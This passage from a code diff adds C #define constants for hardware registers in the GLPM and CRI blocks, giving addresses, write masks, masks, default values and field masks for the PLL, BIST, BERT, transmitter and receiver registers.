+#define GLPM_GLP_FR_BITLOCK_1_WMASK              (0x000000ff)
+#define GLPM_GLP_FR_BITLOCK_1_MASK               (0x000000ff)
+#define GLPM_GLP_FR_BITLOCK_1_DEFAULT            (0x000A)
+#define GLPM_GLP_FR_BITLOCK_1_FMASK              (0x000000ff)
+#define GLPM_GLP_FR_WDG_CFG_0                    GLPM_GLOBAL(0x000028)
+#define GLPM_GLP_FR_WDG_CFG_0_WMASK              (0x0000ffff)
+#define GLPM_GLP_FR_WDG_CFG_0_MASK               (0x0000ffff)
+#define GLPM_GLP_FR_WDG_CFG_0_DEFAULT            (0xFFFF)
+#define GLPM_GLP_FR_WDG_CFG_0_FMASK              (0x0000ffff)
+#define GLPM_GLP_FR_WDG_CFG_1                    GLPM_GLOBAL(0x00002C)
+#define GLPM_GLP_FR_WDG_CFG_1_WMASK              (0x0000ffff)
+#define GLPM_GLP_FR_WDG_CFG_1_MASK               (0x0000ffff)
+#define GLPM_GLP_FR_WDG_CFG_1_DEFAULT            (0xFFFF)
+#define GLPM_GLP_FR_WDG_CFG_1_FMASK              (0x0000ffff)
+#define GLPM_GLP_FR_ERR_LIM_0                    GLPM_GLOBAL(0x000030)
+#define GLPM_GLP_FR_ERR_LIM_0_WMASK              (0x0000ffff)
+#define GLPM_GLP_FR_ERR_LIM_0_MASK               (0x0000ffff)
+#define GLPM_GLP_FR_ERR_LIM_0_DEFAULT            (0x0A64)
+#define GLPM_GLP_FR_ERR_LIM_0_FMASK              (0x0000ffff)
+#define GLPM_GLP_FR_ERR_LIM_1                    GLPM_GLOBAL(0x000034)
+#define GLPM_GLP_FR_ERR_LIM_1_WMASK              (0x0000ffff)
+#define GLPM_GLP_FR_ERR_LIM_1_MASK               (0x0000ffff)
+#define GLPM_GLP_FR_ERR_LIM_1_DEFAULT            (0x0A64)
+#define GLPM_GLP_FR_ERR_LIM_1_FMASK              (0x0000ffff)
+#define GLPM_GLP_FR_UNIQ_WD_0                    GLPM_GLOBAL(0x000038)
+#define GLPM_GLP_FR_UNIQ_WD_0_WMASK              (0x0000ffff)
+#define GLPM_GLP_FR_UNIQ_WD_0_MASK               (0x0000ffff)
+#define GLPM_GLP_FR_UNIQ_WD_0_DEFAULT            (0x6E78)
+#define GLPM_GLP_FR_UNIQ_WD_0_FMASK              (0x0000ffff)
+#define GLPM_GLP_FR_UNIQ_WD_1                    GLPM_GLOBAL(0x00003C)
+#define GLPM_GLP_FR_UNIQ_WD_1_WMASK              (0x0000ffff)
+#define GLPM_GLP_FR_UNIQ_WD_1_MASK               (0x0000ffff)
+#define GLPM_GLP_FR_UNIQ_WD_1_DEFAULT            (0x6E78)
+#define GLPM_GLP_FR_UNIQ_WD_1_FMASK              (0x0000ffff)
+#define GLPM_GLP_FR_RX_UNIQ_WD_0                 GLPM_GLOBAL(0x000040)
+#define GLPM_GLP_FR_RX_UNIQ_WD_0_WMASK           (0x0000ffff)
+#define GLPM_GLP_FR_RX_UNIQ_WD_0_MASK            (0x0000ffff)
+#define GLPM_GLP_FR_RX_UNIQ_WD_0_DEFAULT         (0x0000)
+#define GLPM_GLP_FR_RX_UNIQ_WD_0_FMASK           (0x0000ffff)
+#define GLPM_GLP_FR_RX_UNIQ_WD_1                 GLPM_GLOBAL(0x000044)
+#define GLPM_GLP_FR_RX_UNIQ_WD_1_WMASK           (0x0000ffff)
+#define GLPM_GLP_FR_RX_UNIQ_WD_1_MASK            (0x0000ffff)
+#define GLPM_GLP_FR_RX_UNIQ_WD_1_DEFAULT         (0x0000)
+#define GLPM_GLP_FR_RX_UNIQ_WD_1_FMASK           (0x0000ffff)
+#define GLPM_GLP_FR_ERR_0                        GLPM_GLOBAL(0x000048)
+#define GLPM_GLP_FR_ERR_0_WMASK                  (0x0000ffff)
+#define GLPM_GLP_FR_ERR_0_MASK                   (0x0000ffff)
+#define GLPM_GLP_FR_ERR_0_DEFAULT                (0x0000)
+#define GLPM_GLP_FR_ERR_0_FMASK                  (0x0000ffff)
+#define GLPM_GLP_FR_ERR_1                        GLPM_GLOBAL(0x00004C)
+#define GLPM_GLP_FR_ERR_1_WMASK                  (0x0000ffff)
+#define GLPM_GLP_FR_ERR_1_MASK                   (0x0000ffff)
+#define GLPM_GLP_FR_ERR_1_DEFAULT                (0x0000)
+#define GLPM_GLP_FR_ERR_1_FMASK                  (0x0000ffff)
+#define GLPM_GLP_BIST_CTRL                       GLPM_GLOBAL(0x000050)
+#define GLPM_GLP_BIST_CTRL_WMASK                 (0x0000007f)
+#define GLPM_GLP_BIST_CTRL_MASK                  (0x0000007f)
+#define GLPM_GLP_BIST_CTRL_DEFAULT               (0x0000)
+#define GLPM_GLP_BIST_CTRL_FMASK                 (0x0000007f)
+#define GLPM_GLP_BIST_PHLOCK                     GLPM_GLOBAL(0x000054)
+#define GLPM_GLP_BIST_PHLOCK_WMASK               (0x000003ff)
+#define GLPM_GLP_BIST_PHLOCK_MASK                (0x000003ff)
+#define GLPM_GLP_BIST_PHLOCK_DEFAULT             (0x03E8)
+#define GLPM_GLP_BIST_PHLOCK_FMASK               (0x000003ff)
+#define GLPM_GLP_BIST_END                        GLPM_GLOBAL(0x000058)
+#define GLPM_GLP_BIST_END_WMASK                  (0x000003ff)
+#define GLPM_GLP_BIST_END_MASK                   (0x000003ff)
+#define GLPM_GLP_BIST_END_DEFAULT                (0x03E8)
+#define GLPM_GLP_BIST_END_FMASK                  (0x000003ff)
+#define GLPM_GLP_BERT_TERM                       GLPM_GLOBAL(0x00005C)
+#define GLPM_GLP_BERT_TERM_WMASK                 (0x000003ff)
+#define GLPM_GLP_BERT_TERM_MASK                  (0x000003ff)
+#define GLPM_GLP_BERT_TERM_DEFAULT               (0x0000)
+#define GLPM_GLP_BERT_TERM_FMASK                 (0x000003ff)
+#define GLPM_GLP_BERT_ERR                        GLPM_GLOBAL(0x000060)
+#define GLPM_GLP_BERT_ERR_WMASK                  (0x000003ff)
+#define GLPM_GLP_BERT_ERR_MASK                   (0x000003ff)
+#define GLPM_GLP_BERT_ERR_DEFAULT                (0x0000)
+#define GLPM_GLP_BERT_ERR_FMASK                  (0x000003ff)
+#define GLPM_GLP_BERT_CTRL                       GLPM_GLOBAL(0x000064)
+#define GLPM_GLP_BERT_CTRL_WMASK                 (0x000007ff)
+#define GLPM_GLP_BERT_CTRL_MASK                  (0x000007ff)
+#define GLPM_GLP_BERT_CTRL_DEFAULT               (0x0180)
+#define GLPM_GLP_BERT_CTRL_FMASK                 (0x000007ff)
+#define GLPM_GLP_GLP_CTRL                        GLPM_GLOBAL(0x000068)
+#define GLPM_GLP_GLP_CTRL_WMASK                  (0x0000007f)
+#define GLPM_GLP_GLP_CTRL_MASK                   (0x0000007f)
+#define GLPM_GLP_GLP_CTRL_DEFAULT                (0x0008)
+#define GLPM_GLP_GLP_CTRL_FMASK                  (0x0000007f)
+#define GLPM_GLP_GLP_MISC                        GLPM_GLOBAL(0x00006C)
+#define GLPM_GLP_GLP_MISC_WMASK                  (0x0000ffff)
+#define GLPM_GLP_GLP_MISC_MASK                   (0x0000ffff)
+#define GLPM_GLP_GLP_MISC_DEFAULT                (0xC0C0)
+#define GLPM_GLP_GLP_MISC_FMASK                  (0x0000ffff)
+#define GLPM_PMA_STARTUP_CTRL                    GLPM_GLOBAL(0x000080)
+#define GLPM_PMA_STARTUP_CTRL_WMASK              (0x000007ff)
+#define GLPM_PMA_STARTUP_CTRL_MASK               (0x000007ff)
+#define GLPM_PMA_STARTUP_CTRL_DEFAULT            (0x0400)
+#define GLPM_PMA_STARTUP_CTRL_FMASK              (0x000007ff)
+#define GLPM_PMA_STATE                           GLPM_GLOBAL(0x000084)
+#define GLPM_PMA_STATE_WMASK                     (0x00000007)
+#define GLPM_PMA_STATE_MASK                      (0x00000007)
+#define GLPM_PMA_STATE_DEFAULT                   (0x0000)
+#define GLPM_PMA_STATE_FMASK                     (0x00000007)
+#define GLPM_PLL_CTRL1                           GLPM_GLOBAL(0x000088)
+#define GLPM_PLL_CTRL1_WMASK                     (0x0000ffff)
+#define GLPM_PLL_CTRL1_MASK                      (0x0000ffff)
+#define GLPM_PLL_CTRL1_DEFAULT                   (0x8E39)
+#define GLPM_PLL_CTRL1_FMASK                     (0x0000ffff)
+#define GLPM_PLL_CTRL2                           GLPM_GLOBAL(0x00008C)
+#define GLPM_PLL_CTRL2_WMASK                     (0x0000ffff)
+#define GLPM_PLL_CTRL2_MASK                      (0x0000ffff)
+#define GLPM_PLL_CTRL2_DEFAULT                   (0x0383)
+#define GLPM_PLL_CTRL2_FMASK                     (0x0000ffff)
+#define GLPM_PLL_CTRL3                           GLPM_GLOBAL(0x000090)
+#define GLPM_PLL_CTRL3_WMASK                     (0x00003fff)
+#define GLPM_PLL_CTRL3_MASK                      (0x00003fff)
+#define GLPM_PLL_CTRL3_DEFAULT                   (0x0000)
+#define GLPM_PLL_CTRL3_FMASK                     (0x00003fff)
+#define GLPM_PLL_CTRL4                           GLPM_GLOBAL(0x000094)
+#define GLPM_PLL_CTRL4_WMASK                     (0x0000ffff)
+#define GLPM_PLL_CTRL4_MASK                      (0x0000ffff)
+#define GLPM_PLL_CTRL4_DEFAULT                   (0x0000)
+#define GLPM_PLL_CTRL4_FMASK                     (0x0000ffff)
+#define GLPM_PLL_CTRL5                           GLPM_GLOBAL(0x000098)
+#define GLPM_PLL_CTRL5_WMASK                     (0x0000ffff)
+#define GLPM_PLL_CTRL5_MASK                      (0x0000ffff)
+#define GLPM_PLL_CTRL5_DEFAULT                   (0x0000)
+#define GLPM_PLL_CTRL5_FMASK                     (0x0000ffff)
+#define GLPM_PLL_CTRL6                           GLPM_GLOBAL(0x00009C)
+#define GLPM_PLL_CTRL6_WMASK                     (0x0000ffff)
+#define GLPM_PLL_CTRL6_MASK                      (0x0000ffff)
+#define GLPM_PLL_CTRL6_DEFAULT                   (0x0000)
+#define GLPM_PLL_CTRL6_FMASK                     (0x0000ffff)
+#define GLPM_PLL_CTRL7                           GLPM_GLOBAL(0x0000A0)
+#define GLPM_PLL_CTRL7_WMASK                     (0x0000ffff)
+#define GLPM_PLL_CTRL7_MASK                      (0x0000ffff)
+#define GLPM_PLL_CTRL7_DEFAULT                   (0x0000)
+#define GLPM_PLL_CTRL7_FMASK                     (0x0000ffff)
+#define GLPM_PLL_A_CTRL1                         GLPM_GLOBAL(0x0000A4)
+#define GLPM_PLL_A_CTRL1_WMASK                   (0x0000ffff)
+#define GLPM_PLL_A_CTRL1_MASK                    (0x0000ffff)
+#define GLPM_PLL_A_CTRL1_DEFAULT                 (0x1000)
+#define GLPM_PLL_A_CTRL1_FMASK                   (0x0000ffff)
+#define GLPM_PLL_A_CTRL2                         GLPM_GLOBAL(0x0000A8)
+#define GLPM_PLL_A_CTRL2_WMASK                   (0x00007fff)
+#define GLPM_PLL_A_CTRL2_MASK                    (0x00007fff)
+#define GLPM_PLL_A_CTRL2_DEFAULT                 (0x1800)
+#define GLPM_PLL_A_CTRL2_FMASK                   (0x00007fff)
+#define GLPM_PLL_A_CTRL3                         GLPM_GLOBAL(0x0000AC)
+#define GLPM_PLL_A_CTRL3_WMASK                   (0x0000ffff)
+#define GLPM_PLL_A_CTRL3_MASK                    (0x0000ffff)
+#define GLPM_PLL_A_CTRL3_DEFAULT                 (0x0100)
+#define GLPM_PLL_A_CTRL3_FMASK                   (0x0000ffff)
+#define GLPM_PLL_STATUS                          GLPM_GLOBAL(0x0000B0)
+#define GLPM_PLL_STATUS_WMASK                    (0x00000073)
+#define GLPM_PLL_STATUS_MASK                     (0x00000073)
+#define GLPM_PLL_STATUS_DEFAULT                  (0x0000)
+#define GLPM_PLL_STATUS_FMASK                    (0x00000073)
+#define GLPM_TX1_CTRL1                           GLPM_GLOBAL(0x0000C0)
+#define GLPM_TX1_CTRL1_WMASK                     (0x00003f1f)
+#define GLPM_TX1_CTRL1_MASK                      (0x00003f1f)
+#define GLPM_TX1_CTRL1_DEFAULT                   (0x0009)
+#define GLPM_TX1_CTRL1_FMASK                     (0x00003f1f)
+#define GLPM_TX1_CTRL2                           GLPM_GLOBAL(0x0000C4)
+#define GLPM_TX1_CTRL2_WMASK                     (0x00003fff)
+#define GLPM_TX1_CTRL2_MASK                      (0x00003fff)
+#define GLPM_TX1_CTRL2_DEFAULT                   (0x2096)
+#define GLPM_TX1_CTRL2_FMASK                     (0x00003fff)
+#define GLPM_TX1_CTRL3                           GLPM_GLOBAL(0x0000C8)
+#define GLPM_TX1_CTRL3_WMASK                     (0x0000ffff)
+#define GLPM_TX1_CTRL3_MASK                      (0x0000ffff)
+#define GLPM_TX1_CTRL3_DEFAULT                   (0xFFFF)
+#define GLPM_TX1_CTRL3_FMASK                     (0x0000ffff)
+#define GLPM_TX1_A_CTRL1                         GLPM_GLOBAL(0x0000CC)
+#define GLPM_TX1_A_CTRL1_WMASK                   (0x0000ff1f)
+#define GLPM_TX1_A_CTRL1_MASK                    (0x0000ff1f)
+#define GLPM_TX1_A_CTRL1_DEFAULT                 (0x0010)
+#define GLPM_TX1_A_CTRL1_FMASK                   (0x0000ff1f)
+#define GLPM_TX1_A_CTRL2                         GLPM_GLOBAL(0x0000D0)
+#define GLPM_TX1_A_CTRL2_WMASK                   (0x0000ffff)
+#define GLPM_TX1_A_CTRL2_MASK                    (0x0000ffff)
+#define GLPM_TX1_A_CTRL2_DEFAULT                 (0x408F)
+#define GLPM_TX1_A_CTRL2_FMASK                   (0x0000ffff)
+#define GLPM_TX1_MOD1                            GLPM_GLOBAL(0x0000D4)
+#define GLPM_TX1_MOD1_WMASK                      (0x00003fff)
+#define GLPM_TX1_MOD1_MASK                       (0x00003fff)
+#define GLPM_TX1_MOD1_DEFAULT                    (0x0000)
+#define GLPM_TX1_MOD1_FMASK                      (0x00003fff)
+#define GLPM_TX1_MOD2                            GLPM_GLOBAL(0x0000D8)
+#define GLPM_TX1_MOD2_WMASK                      (0x0000ffff)
+#define GLPM_TX1_MOD2_MASK                       (0x0000ffff)
+#define GLPM_TX1_MOD2_DEFAULT                    (0x0000)
+#define GLPM_TX1_MOD2_FMASK                      (0x0000ffff)
+#define GLPM_TX1_MOD3                            GLPM_GLOBAL(0x0000DC)
+#define GLPM_TX1_MOD3_WMASK                      (0x000007ff)
+#define GLPM_TX1_MOD3_MASK                       (0x000007ff)
+#define GLPM_TX1_MOD3_DEFAULT                    (0x0180)
+#define GLPM_TX1_MOD3_FMASK                      (0x000007ff)
+#define GLPM_TX2_CTRL1                           GLPM_GLOBAL(0x0000E0)
+#define GLPM_TX2_CTRL1_WMASK                     (0x00003f1f)
+#define GLPM_TX2_CTRL1_MASK                      (0x00003f1f)
+#define GLPM_TX2_CTRL1_DEFAULT                   (0x0009)
+#define GLPM_TX2_CTRL1_FMASK                     (0x00003f1f)
+#define GLPM_TX2_CTRL2                           GLPM_GLOBAL(0x0000E4)
+#define GLPM_TX2_CTRL2_WMASK                     (0x00003fff)
+#define GLPM_TX2_CTRL2_MASK                      (0x00003fff)
+#define GLPM_TX2_CTRL2_DEFAULT                   (0x2096)
+#define GLPM_TX2_CTRL2_FMASK                     (0x00003fff)
+#define GLPM_TX2_CTRL3                           GLPM_GLOBAL(0x0000E8)
+#define GLPM_TX2_CTRL3_WMASK                     (0x0000ffff)
+#define GLPM_TX2_CTRL3_MASK                      (0x0000ffff)
+#define GLPM_TX2_CTRL3_DEFAULT                   (0xFFFF)
+#define GLPM_TX2_CTRL3_FMASK                     (0x0000ffff)
+#define GLPM_TX2_A_CTRL1                         GLPM_GLOBAL(0x0000EC)
+#define GLPM_TX2_A_CTRL1_WMASK                   (0x0000ff1f)
+#define GLPM_TX2_A_CTRL1_MASK                    (0x0000ff1f)
+#define GLPM_TX2_A_CTRL1_DEFAULT                 (0x0010)
+#define GLPM_TX2_A_CTRL1_FMASK                   (0x0000ff1f)
+#define GLPM_TX2_A_CTRL2                         GLPM_GLOBAL(0x0000F0)
+#define GLPM_TX2_A_CTRL2_WMASK                   (0x0000ffff)
+#define GLPM_TX2_A_CTRL2_MASK                    (0x0000ffff)
+#define GLPM_TX2_A_CTRL2_DEFAULT                 (0x408F)
+#define GLPM_TX2_A_CTRL2_FMASK                   (0x0000ffff)
+#define GLPM_TX2_MOD1                            GLPM_GLOBAL(0x0000F4)
+#define GLPM_TX2_MOD1_WMASK                      (0x00003fff)
+#define GLPM_TX2_MOD1_MASK                       (0x00003fff)
+#define GLPM_TX2_MOD1_DEFAULT                    (0x0000)
+#define GLPM_TX2_MOD1_FMASK                      (0x00003fff)
+#define GLPM_TX2_MOD2                            GLPM_GLOBAL(0x0000F8)
+#define GLPM_TX2_MOD2_WMASK                      (0x0000ffff)
+#define GLPM_TX2_MOD2_MASK                       (0x0000ffff)
+#define GLPM_TX2_MOD2_DEFAULT                    (0x0000)
+#define GLPM_TX2_MOD2_FMASK                      (0x0000ffff)
+#define GLPM_TX2_MOD3                            GLPM_GLOBAL(0x0000FC)
+#define GLPM_TX2_MOD3_WMASK                      (0x000007ff)
+#define GLPM_TX2_MOD3_MASK                       (0x000007ff)
+#define GLPM_TX2_MOD3_DEFAULT                    (0x0180)
+#define GLPM_TX2_MOD3_FMASK                      (0x000007ff)
+#define GLPM_TX3_CTRL1                           GLPM_GLOBAL(0x000100)
+#define GLPM_TX3_CTRL1_WMASK                     (0x00003f1f)
+#define GLPM_TX3_CTRL1_MASK                      (0x00003f1f)
+#define GLPM_TX3_CTRL1_DEFAULT                   (0x0009)
+#define GLPM_TX3_CTRL1_FMASK                     (0x00003f1f)
+#define GLPM_TX3_CTRL2                           GLPM_GLOBAL(0x000104)
+#define GLPM_TX3_CTRL2_WMASK                     (0x00003fff)
+#define GLPM_TX3_CTRL2_MASK                      (0x00003fff)
+#define GLPM_TX3_CTRL2_DEFAULT                   (0x2096)
+#define GLPM_TX3_CTRL2_FMASK                     (0x00003fff)
+#define GLPM_TX3_CTRL3                           GLPM_GLOBAL(0x000108)
+#define GLPM_TX3_CTRL3_WMASK                     (0x0000ffff)
+#define GLPM_TX3_CTRL3_MASK                      (0x0000ffff)
+#define GLPM_TX3_CTRL3_DEFAULT                   (0xFFFF)
+#define GLPM_TX3_CTRL3_FMASK                     (0x0000ffff)
+#define GLPM_TX3_A_CTRL1                         GLPM_GLOBAL(0x00010C)
+#define GLPM_TX3_A_CTRL1_WMASK                   (0x0000ff1f)
+#define GLPM_TX3_A_CTRL1_MASK                    (0x0000ff1f)
+#define GLPM_TX3_A_CTRL1_DEFAULT                 (0x0010)
+#define GLPM_TX3_A_CTRL1_FMASK                   (0x0000ff1f)
+#define GLPM_TX3_A_CTRL2                         GLPM_GLOBAL(0x000110)
+#define GLPM_TX3_A_CTRL2_WMASK                   (0x0000ffff)
+#define GLPM_TX3_A_CTRL2_MASK                    (0x0000ffff)
+#define GLPM_TX3_A_CTRL2_DEFAULT                 (0x408F)
+#define GLPM_TX3_A_CTRL2_FMASK                   (0x0000ffff)
+#define GLPM_TX3_MOD1                            GLPM_GLOBAL(0x000114)
+#define GLPM_TX3_MOD1_WMASK                      (0x00003fff)
+#define GLPM_TX3_MOD1_MASK                       (0x00003fff)
+#define GLPM_TX3_MOD1_DEFAULT                    (0x0000)
+#define GLPM_TX3_MOD1_FMASK                      (0x00003fff)
+#define GLPM_TX3_MOD2                            GLPM_GLOBAL(0x000118)
+#define GLPM_TX3_MOD2_WMASK                      (0x0000ffff)
+#define GLPM_TX3_MOD2_MASK                       (0x0000ffff)
+#define GLPM_TX3_MOD2_DEFAULT                    (0x0000)
+#define GLPM_TX3_MOD2_FMASK                      (0x0000ffff)
+#define GLPM_TX3_MOD3                            GLPM_GLOBAL(0x00011C)
+#define GLPM_TX3_MOD3_WMASK                      (0x000007ff)
+#define GLPM_TX3_MOD3_MASK                       (0x000007ff)
+#define GLPM_TX3_MOD3_DEFAULT                    (0x0180)
+#define GLPM_TX3_MOD3_FMASK                      (0x000007ff)
+#define GLPM_TX4_CTRL1                           GLPM_GLOBAL(0x000120)
+#define GLPM_TX4_CTRL1_WMASK                     (0x00003f1f)
+#define GLPM_TX4_CTRL1_MASK                      (0x00003f1f)
+#define GLPM_TX4_CTRL1_DEFAULT                   (0x0009)
+#define GLPM_TX4_CTRL1_FMASK                     (0x00003f1f)
+#define GLPM_TX4_CTRL2                           GLPM_GLOBAL(0x000124)
+#define GLPM_TX4_CTRL2_WMASK                     (0x00003fff)
+#define GLPM_TX4_CTRL2_MASK                      (0x00003fff)
+#define GLPM_TX4_CTRL2_DEFAULT                   (0x2096)
+#define GLPM_TX4_CTRL2_FMASK                     (0x00003fff)
+#define GLPM_TX4_CTRL3                           GLPM_GLOBAL(0x000128)
+#define GLPM_TX4_CTRL3_WMASK                     (0x0000ffff)
+#define GLPM_TX4_CTRL3_MASK                      (0x0000ffff)
+#define GLPM_TX4_CTRL3_DEFAULT                   (0xFFFF)
+#define GLPM_TX4_CTRL3_FMASK                     (0x0000ffff)
+#define GLPM_TX4_A_CTRL1                         GLPM_GLOBAL(0x00012C)
+#define GLPM_TX4_A_CTRL1_WMASK                   (0x0000ff1f)
+#define GLPM_TX4_A_CTRL1_MASK                    (0x0000ff1f)
+#define GLPM_TX4_A_CTRL1_DEFAULT                 (0x0010)
+#define GLPM_TX4_A_CTRL1_FMASK                   (0x0000ff1f)
+#define GLPM_TX4_A_CTRL2                         GLPM_GLOBAL(0x000130)
+#define GLPM_TX4_A_CTRL2_WMASK                   (0x0000ffff)
+#define GLPM_TX4_A_CTRL2_MASK                    (0x0000ffff)
+#define GLPM_TX4_A_CTRL2_DEFAULT                 (0x408F)
+#define GLPM_TX4_A_CTRL2_FMASK                   (0x0000ffff)
+#define GLPM_TX4_MOD1                            GLPM_GLOBAL(0x000134)
+#define GLPM_TX4_MOD1_WMASK                      (0x00003fff)
+#define GLPM_TX4_MOD1_MASK                       (0x00003fff)
+#define GLPM_TX4_MOD1_DEFAULT                    (0x0000)
+#define GLPM_TX4_MOD1_FMASK                      (0x00003fff)
+#define GLPM_TX4_MOD2                            GLPM_GLOBAL(0x000138)
+#define GLPM_TX4_MOD2_WMASK                      (0x0000ffff)
+#define GLPM_TX4_MOD2_MASK                       (0x0000ffff)
+#define GLPM_TX4_MOD2_DEFAULT                    (0x0000)
+#define GLPM_TX4_MOD2_FMASK                      (0x0000ffff)
+#define GLPM_TX4_MOD3                            GLPM_GLOBAL(0x00013C)
+#define GLPM_TX4_MOD3_WMASK                      (0x000007ff)
+#define GLPM_TX4_MOD3_MASK                       (0x000007ff)
+#define GLPM_TX4_MOD3_DEFAULT                    (0x0180)
+#define GLPM_TX4_MOD3_FMASK                      (0x000007ff)
+#define GLPM_RX1_CTRL1                           GLPM_GLOBAL(0x000140)
+#define GLPM_RX1_CTRL1_WMASK                     (0x00003fff)
+#define GLPM_RX1_CTRL1_MASK                      (0x00003fff)
+#define GLPM_RX1_CTRL1_DEFAULT                   (0x0005)
+#define GLPM_RX1_CTRL1_FMASK                     (0x00003fff)
+#define GLPM_RX1_CTRL2                           GLPM_GLOBAL(0x000144)
+#define GLPM_RX1_CTRL2_WMASK                     (0x00003fff)
+#define GLPM_RX1_CTRL2_MASK                      (0x00003fff)
+#define GLPM_RX1_CTRL2_DEFAULT                   (0x2000)
+#define GLPM_RX1_CTRL2_FMASK                     (0x00003fff)
+#define GLPM_RX1_CDR                             GLPM_GLOBAL(0x000148)
+#define GLPM_RX1_CDR_WMASK                       (0x00000377)
+#define GLPM_RX1_CDR_MASK                        (0x00000377)
+#define GLPM_RX1_CDR_DEFAULT                     (0x0144)
+#define GLPM_RX1_CDR_FMASK                       (0x00000377)
+#define GLPM_RX1_EI                              GLPM_GLOBAL(0x00014C)
+#define GLPM_RX1_EI_WMASK                        (0x0000ffff)
+#define GLPM_RX1_EI_MASK                         (0x0000ffff)
+#define GLPM_RX1_EI_DEFAULT                      (0xFFFF)
+#define GLPM_RX1_EI_FMASK                        (0x0000ffff)
+#define GLPM_RX1_CAL                             GLPM_GLOBAL(0x000150)
+#define GLPM_RX1_CAL_WMASK                       (0x000003ff)
+#define GLPM_RX1_CAL_MASK                        (0x000003ff)
+#define GLPM_RX1_CAL_DEFAULT                     (0x00FF)
+#define GLPM_RX1_CAL_FMASK                       (0x000003ff)
+#define GLPM_RX1_A_CTRL                          GLPM_GLOBAL(0x000154)
+#define GLPM_RX1_A_CTRL_WMASK                    (0x00007fff)
+#define GLPM_RX1_A_CTRL_MASK                     (0x00007fff)
+#define GLPM_RX1_A_CTRL_DEFAULT                  (0x6800)
+#define GLPM_RX1_A_CTRL_FMASK                    (0x00007fff)
+#define GLPM_RX1_TEST_CTRL                       GLPM_GLOBAL(0x000158)
+#define GLPM_RX1_TEST_CTRL_WMASK                 (0x00000003)
+#define GLPM_RX1_TEST_CTRL_MASK                  (0x00000003)
+#define GLPM_RX1_TEST_CTRL_DEFAULT               (0x0002)
+#define GLPM_RX1_TEST_CTRL_FMASK                 (0x00000003)
+#define GLPM_RX2_CTRL1                           GLPM_GLOBAL(0x000160)
+#define GLPM_RX2_CTRL1_WMASK                     (0x00003fff)
+#define GLPM_RX2_CTRL1_MASK                      (0x00003fff)
+#define GLPM_RX2_CTRL1_DEFAULT                   (0x0005)
+#define GLPM_RX2_CTRL1_FMASK                     (0x00003fff)
+#define GLPM_RX2_CTRL2                           GLPM_GLOBAL(0x000164)
+#define GLPM_RX2_CTRL2_WMASK                     (0x00003fff)
+#define GLPM_RX2_CTRL2_MASK                      (0x00003fff)
+#define GLPM_RX2_CTRL2_DEFAULT                   (0x2000)
+#define GLPM_RX2_CTRL2_FMASK                     (0x00003fff)
+#define GLPM_RX2_CDR                             GLPM_GLOBAL(0x000168)
+#define GLPM_RX2_CDR_WMASK                       (0x00000377)
+#define GLPM_RX2_CDR_MASK                        (0x00000377)
+#define GLPM_RX2_CDR_DEFAULT                     (0x0144)
+#define GLPM_RX2_CDR_FMASK                       (0x00000377)
+#define GLPM_RX2_EI                              GLPM_GLOBAL(0x00016C)
+#define GLPM_RX2_EI_WMASK                        (0x0000ffff)
+#define GLPM_RX2_EI_MASK                         (0x0000ffff)
+#define GLPM_RX2_EI_DEFAULT                      (0xFFFF)
+#define GLPM_RX2_EI_FMASK                        (0x0000ffff)
+#define GLPM_RX2_CAL                             GLPM_GLOBAL(0x000170)
+#define GLPM_RX2_CAL_WMASK                       (0x000003ff)
+#define GLPM_RX2_CAL_MASK                        (0x000003ff)
+#define GLPM_RX2_CAL_DEFAULT                     (0x00FF)
+#define GLPM_RX2_CAL_FMASK                       (0x000003ff)
+#define GLPM_RX2_A_CTRL                          GLPM_GLOBAL(0x000174)
+#define GLPM_RX2_A_CTRL_WMASK                    (0x00007fff)
+#define GLPM_RX2_A_CTRL_MASK                     (0x00007fff)
+#define GLPM_RX2_A_CTRL_DEFAULT                  (0x6800)
+#define GLPM_RX2_A_CTRL_FMASK                    (0x00007fff)
+#define GLPM_RX2_TEST_CTRL                       GLPM_GLOBAL(0x000178)
+#define GLPM_RX2_TEST_CTRL_WMASK                 (0x00000003)
+#define GLPM_RX2_TEST_CTRL_MASK                  (0x00000003)
+#define GLPM_RX2_TEST_CTRL_DEFAULT               (0x0002)
+#define GLPM_RX2_TEST_CTRL_FMASK                 (0x00000003)
+
+/* Cri Memory Address Constants */ 
+
+/* Cri Global Address Constants */ 
+#define cri_global_base        (0x20C400)
+#define CRI_GLOBAL(r)          (int)(cri_global_base + (r))
+#define cri_global_size        (0x0200)
+
+#define CRI_CCR                CRI_GLOBAL(0x0000)
+#define CRI_CCR_WMASK          (0x001F)
+#define CRI_CCR_MASK           (0x001F)
+#define CRI_CCR_DEFAULT        (0x0000)
+#define CRI_CCR_FMASK          (0x001F)
+#define CRI_RST                CRI_GLOBAL(0x0004)
+#define CRI_RST_WMASK          (0x007F)
+#define CRI_RST_MASK           (0x007F)
+#define CRI_RST_DEFAULT        (0x0000)
+#define CRI_RST_FMASK          (0x007F)
+#define CRI_PORT_MODE          CRI_GLOBAL(0x0008)
+#define CRI_PORT_MODE_WMASK    (0x1555)
+#define CRI_PORT_MODE_MASK     (0x1555)
+#define CRI_PORT_MODE_DEFAULT  (0x0000)
+#define CRI_PORT_MODE_FMASK    (0x1555)
+#define CRI_TSC_CTRL           CRI_GLOBAL(0x000C)
+#define CRI_TSC_CTRL_WMASK     (0xFFFFFFF)
+#define CRI_TSC_CTRL_MASK      (0x8FFFFFFF)
+#define CRI_TSC_CTRL_DEFAULT   (0x1FFFE0)
+#define CRI_TSC_CTRL_FMASK     (0xFFFFFFF)
+#define CRI_TSC_STATUS         CRI_GLOBAL(0x0010)
+#define CRI_TSC_STATUS_WMASK   (0x0000)
+#define CRI_TSC_STATUS_MASK    (0x3FFFFF)
+#define CRI_TSC_STATUS_DEFAULT (0x0000)
+#define CRI_TSC_STATUS_FMASK   (0x3FFFFF)
+#define CRI_TX_TSLOTC_A        CRI_GLOBAL(0x0014)
+#define CRI_TX_TSLOTC_A_WMASK  (0x0000)
+#define CRI_TX_TSLOTC_A_MASK   (0x3E0FFFFF)
+#define CRI_TX_TSLOTC_A_DEFAULT (0x3E0FFFFF)
+#define CRI_TX_TSLOTC_A_FMASK  (0x0000)
+#define CRI_TX_TSLOTC_B        CRI_GLOBAL(0x0018)
+#define CRI_TX_TSLOTC_B_WMASK  (0x0000)
+#define CRI_TX_TSLOTC_B_MASK   (0x3E0FFFFF)
+#define CRI_TX_TSLOTC_B_DEFAULT (0x3E0FFFFF)
+#define CRI_TX_TSLOTC_B_FMASK  (0x0000)
+#define CRI_TX_TSLOT0          CRI_GLOBAL(0x001C)
+#define CRI_TX_TSLOT0_WMASK    (0x3E0FFFFF)
+#define CRI_TX_TSLOT0_MASK     (0x3E0FFFFF)
